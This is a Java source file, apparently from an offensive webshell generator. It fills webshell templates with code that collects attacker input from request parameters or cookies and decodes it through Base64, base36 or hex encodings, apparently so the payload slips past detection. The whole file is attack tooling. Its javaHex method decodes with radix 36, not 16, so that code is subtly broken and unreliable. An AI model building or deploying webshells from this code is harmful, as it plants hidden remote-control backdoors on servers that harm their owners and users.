package org.b1ackc4t.webshell;

import org.b1ackc4t.sender.Sender;
import org.b1ackc4t.util.Utils;

import java.io.File;

public class JavaTemplate {

    public static String getTemplate(String tamper) {
        String tem = null;
        String path = "webshell/java/";
        tem = Utils.readFileByString(new File(path + tamper));
        return tem;
    }

    private static String getMethodCode(String method) {
        String code = null;
        switch (method) {
            case "get":
            case "post":
            case "mixed":
                code = "Set<Map.Entry<String, String[]>> __=request.getParameterMap().entrySet();for(Map.Entry _:__){r+=((String[])_.getValue())[0];}";
                break;
            case "cookie":
                code = "Cookie[] __=request.getCookies();if(__!=null)for(Cookie _:__){if(!_.getName().equals(\"JSESSIONID\"))r+=java.net.URLDecoder.decode(_.getValue());}";
                break;
            default:
                System.out.println("unsupported method!");
                return null;
        }
        return code;
    }

    public static String javaBase64_1(String key, String tamper, String method) {
        String tem = getTemplate(tamper);
        if (tem == null) return null;
        key = Sender.getKey(key);
        method = getMethodCode(method);
        if (method == null) return null;
        String decode = "new sun.misc.BASE64Decoder().decodeBuffer(r)";
        return tem.replaceFirst("\\{@key\\}", key).replaceFirst("\\{@getvalue\\}", method).replaceFirst("\\{@decode\\}", decode);
    }

    /**
     * 针对jdk1.8及以上
     * @param key
     * @param tamper
     * @return
     */
    public static String javaBase64_2(String key, String tamper, String method) {
        String tem = getTemplate(tamper);
        if (tem == null) return null;
        key = Sender.getKey(key);
        method = getMethodCode(method);
        if (method == null) return null;
        String decode = "Base64.getDecoder().decode(r)";
        return tem.replaceFirst("\\{@key\\}", key).replaceFirst("\\{@getvalue\\}", method).replaceFirst("\\{@decode\\}", decode);
    }

    public static String javaBase36(String key, String tamper, String method) {
        String tem = getTemplate(tamper);
        if (tem == null) return null;
        key = Sender.getKey(key);
        method = getMethodCode(method);
        if (method == null) return null;
        String decode = "new java.math.BigInteger(r, 36).toByteArray()";
        return tem.replaceFirst("\\{@key\\}", key).replaceFirst("\\{@getvalue\\}", method).replaceFirst("\\{@decode\\}", decode);
    }

    public static String javaHex(String key, String tamper, String method) {
        String tem = getTemplate(tamper);
        if (tem == null) return null;
        key = Sender.getKey(key);
        method = getMethodCode(method);
        if (method == null) return null;
        String decode = "new java.math.BigInteger(r, 36).toByteArray()";
        return tem.replaceFirst("\\{@key\\}", key).replaceFirst("\\{@getvalue\\}", method).replaceFirst("\\{@decode\\}", decode);
    }
}
